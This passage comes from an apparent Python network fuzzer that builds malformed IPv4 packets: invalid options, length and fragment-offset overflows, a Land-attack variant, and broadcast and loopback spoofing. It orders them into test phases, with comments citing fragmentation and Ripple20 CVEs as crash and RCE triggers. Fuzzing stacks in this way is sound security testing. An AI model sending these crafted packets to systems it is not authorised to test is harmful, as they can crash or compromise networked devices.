                            self._ip_to_bytes(dest_ip),
                        )
                        + b"\x07\x27\xff"
                        + b"\x00" * 32,  # Record route with invalid pointer
                        # Router Alert option with malformed data
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x46,
                            0,
                            28,
                            0,
                            0,
                            64,
                            6,
                            0,
                            self._ip_to_bytes(source_ip),
                            self._ip_to_bytes(dest_ip),
                        )
                        + b"\x94\x04\xff\xff",  # Router Alert with non-zero value
                        # Security option with invalid compartments (RFC 1038)
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x47,
                            0,
                            32,
                            0,
                            0,
                            64,
                            6,
                            0,
                            self._ip_to_bytes(source_ip),
                            self._ip_to_bytes(dest_ip),
                        )
                        + b"\x82\x0b\x00\x00\xff\xff\xff\xff\xff\xff\xff",  # Invalid security level
                        # Stream ID option (deprecated, should be ignored)
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x46,
                            0,
                            28,
                            0,
                            0,
                            64,
                            6,
                            0,
                            self._ip_to_bytes(source_ip),
                            self._ip_to_bytes(dest_ip),
                        )
                        + b"\x88\x04\xff\xff",  # Stream ID with max value
                    ],
                )
            ),
        )

        # Integer overflow and edge case exploits
        ipv4_integer_exploits = Request(
            "IPv4_Integer_Exploits",
            children=(
                Group(
                    "integer_attacks",
                    values=[
                        # Total length smaller than header (underflow)
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x45,
                            0,
                            10,
                            0,
                            0,
                            64,
                            6,
                            0,
                            self._ip_to_bytes(source_ip),
                            self._ip_to_bytes(dest_ip),
                        ),
                        # Total length exactly 20 (minimum, no payload)
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x45,
                            0,
                            20,
                            0,
                            0,
                            64,
                            6,
                            0,
                            self._ip_to_bytes(source_ip),
                            self._ip_to_bytes(dest_ip),
                        ),
                        # Maximum total length (65535)
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x45,
                            0,
                            65535,
                            0,
                            0,
                            64,
                            6,
                            0,
                            self._ip_to_bytes(source_ip),
                            self._ip_to_bytes(dest_ip),
                        )
                        + b"X" * 65515,
                        # IHL indicating header larger than total length
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x4F,
                            0,
                            50,
                            0,
                            0,
                            64,
                            6,
                            0,
                            self._ip_to_bytes(source_ip),
                            self._ip_to_bytes(dest_ip),
                        )
                        + b"\x00" * 30,
                        # Fragment offset causing integer overflow (8191*8 + data > 65535)
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x45,
                            0,
                            100,
                            0xFFFF,
                            0x1FFF,
                            64,
                            1,
                            0,
                            self._ip_to_bytes(source_ip),
                            self._ip_to_bytes(dest_ip),
                        )
                        + b"overflow" * 10,
                        # TTL transitions (255->0, trigger ICMP Time Exceeded)
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x45,
                            0,
                            84,
                            0,
                            0,
                            1,
                            6,
                            0,
                            self._ip_to_bytes(source_ip),
                            self._ip_to_bytes(dest_ip),
                        )
                        + b"ttl_test" * 8,
                    ],
                )
            ),
        )

        # State confusion attacks
        ipv4_state_attacks = Request(
            "IPv4_State_Attacks",
            children=(
                Group(
                    "state_confusion",
                    values=[
                        # Self-targeting packet (Land attack variant)
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x45,
                            0,
                            40,
                            0x1337,
                            0x4000,
                            64,
                            6,
                            0,
                            self._ip_to_bytes(dest_ip),
                            self._ip_to_bytes(dest_ip),
                        )
                        + struct.pack(
                            ">HHIIBBHHH", 139, 139, 0x12345678, 0x12345678, 0x50, 0x02, 8192, 0, 0
                        ),
                        # Broadcast source/destination confusion
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x45,
                            0,
                            28,
                            0,
                            0,
                            64,
                            17,
                            0,
                            b"\xff\xff\xff\xff",
                            b"\xff\xff\xff\xff",
                        )
                        + struct.pack(">HHHH", 68, 67, 8, 0),  # DHCP ports
                        # Loopback routing confusion
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x45,
                            0,
                            84,
                            0,
                            0,
                            64,
                            1,
                            0,
                            b"\x7f\x00\x00\x01",
                            self._ip_to_bytes(dest_ip),
                        )
                        + b"\x08\x00\x00\x00\x00\x01\x00\x01"
                        + b"loopback_test" * 4,
                        # Class E address usage (240.0.0.0/4)
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x45,
                            0,
                            60,
                            0,
                            0,
                            64,
                            6,
                            0,
                            b"\xf0\x00\x00\x01",
                            self._ip_to_bytes(dest_ip),
                        )
                        + b"class_e_test" * 3,
                    ],
                )
            ),
        )

        # ==================== SESSION CONNECTION ORDER ====================
        # Optimized for maximum early coverage and crash detection
        # Total estimated time: ~10 minutes for full fuzzing run
        #
        # Use --enable or --disable CLI flags to select specific request groups

        # ==================== PHASE 1: QUICK COVERAGE (~30 sec) ====================
        # Touch all packet types once with minimal params for breadth coverage
        if self.is_request_enabled("IPv4_Quick_Coverage"):
            self.session.connect(ipv4_quick_coverage)

        # ==================== PHASE 2: HIGH-CRASH CVE EXPLOITS (~3 min) ====================
        # Critical CVE attacks that historically cause crashes/RCE
        if self.is_request_enabled("IPv4_Fragment_Exploits"):
            self.session.connect(ipv4_fragment_exploits)  # CVE-1999-0128, CVE-1997-0124

        if self.is_request_enabled("IPv4_Option_Exploits"):
            self.session.connect(ipv4_option_exploits)  # CVE-2019-12256 pattern

        if self.is_request_enabled("IPv4_Integer_Exploits"):
            self.session.connect(ipv4_integer_exploits)  # Integer overflow/underflow

        # ==================== PHASE 3: RIPPLE20 & STATE ATTACKS (~2 min) ====================
        # Treck TCP/IP stack CVEs and state confusion attacks
        if self.is_request_enabled("IPv4_Ripple20_Attacks"):
            self.session.connect(ipv4_ripple20_attacks)  # CVE-2020-11896/11900/11909

        if self.is_request_enabled("IPv4_State_Attacks"):
            self.session.connect(ipv4_state_attacks)  # Land attack, broadcast, loopback

        # ==================== PHASE 4: BOUNDARY ATTACKS (~2 min) ====================
        # Validation bypass and boundary testing
        if self.is_request_enabled("IPv4_Corrupted_Checksum"):
            self.session.connect(ipv4_corrupted_checksum)

        if self.is_request_enabled("IPv4_Incorrect_Length"):
            self.session.connect(ipv4_incorrect_length)

        if self.is_request_enabled("IPv4_Malformed"):
            self.session.connect(ipv4_malformed)

        # ==================== PHASE 5: STANDARD PACKET TYPES (~2 min) ====================
        # Basic protocol fuzzing for full coverage
        if self.is_request_enabled("IPv4_Basic"):
            self.session.connect(ipv4_basic)

        if self.is_request_enabled("IPv4_TCP"):
            self.session.connect(ipv4_tcp)

        if self.is_request_enabled("IPv4_UDP"):
            self.session.connect(ipv4_udp)

        if self.is_request_enabled("IPv4_ICMP"):
            self.session.connect(ipv4_icmp)

        # ==================== PHASE 6: EXTENDED TESTS (conditional) ====================
        # Only enabled with specific options
        if include_options and self.is_request_enabled("IPv4_With_Options"):
            self.session.connect(ipv4_with_options)

        if fragment:
            if self.is_request_enabled("IPv4_Fragment_First"):
                self.session.connect(ipv4_fragment_1)
            if self.is_request_enabled("IPv4_Fragment_Middle"):
                self.session.connect(ipv4_fragment_2)
            if self.is_request_enabled("IPv4_Fragment_Last"):
                self.session.connect(ipv4_fragment_3)
